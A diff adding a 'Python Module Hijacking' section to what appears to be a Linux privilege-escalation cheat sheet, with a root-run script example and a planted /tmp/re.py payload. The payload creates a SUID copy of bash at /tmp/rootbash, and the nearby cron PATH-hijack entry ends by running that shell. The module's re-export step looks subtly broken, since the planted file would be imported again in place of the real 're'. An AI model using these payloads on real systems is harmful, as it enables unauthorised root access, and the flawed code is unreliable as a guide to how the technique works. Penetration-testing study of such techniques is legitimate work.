@@ -598,7 +598,53 @@ chmod +x /home/user/echo
 # Wait for cron job to execute, which will execute echo found in the working directory instead of the real one and run
 /tmp/rootbash -p
 ```
+### Python Module Hijacking
 
+Requirments: 
+
+- A python script is being executed/invoked with elevated privlidges or privlidges different thans yours(horizontal priv esc)
+- The python script exists in a directory thats writable by your controlled user
+- The python script being executed is importing modules such as re etc
+
+Example of would be a script such as: 
+```bash
+#!/bin/bash
+
+#script is running as root
+python3 /tmp/some_python_script.py
+```
+and the contents of some_python_script.py is: 
+```python
+import dateutil    # shadow: /tmp/dateutil/__init__.py
+import datetime    # shadow: /tmp/datetime.py
+import argparse    # shadow: /tmp/argparse.py
+import sys         # shadow: /tmp/sys.py
+import time        # shadow: /tmp/time.py
+#etc some code ...
+```
+As seen above, we can shadow the actual imports with our own by writing .py files with the name of the imported modules in the writable directory.
+
+Due to the way python will import the modules, it first starts by looking in the same/current directory of which the python script is being executed from.
+
+### Exploitation Methods
+
+We then simply create a .py file with the same name as one of the modules being imported, such as for example re.py, with our attacker controlled code. This will then be executed upon the calling of the import statement. We will also then call the real function to prevent system crashing or potential stability issues:
+```python
+# /tmp/re.py  — planted by local attacker
+import os
+import subprocess
+
+# Payload executes as whatever user runs the parent script (potentially root)
+subprocess.run(['bash', '-c', 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash'])
+
+# Re-export the real module so the script doesn't crash/alert
+import importlib, sys
+del sys.modules['re']
+_real = importlib.import_module('re')
+sys.modules['re'] = _real
+compile = _real.compile
+M = _real.M
+```
 ### Wildcard Injection Attack
 
 Requirements:
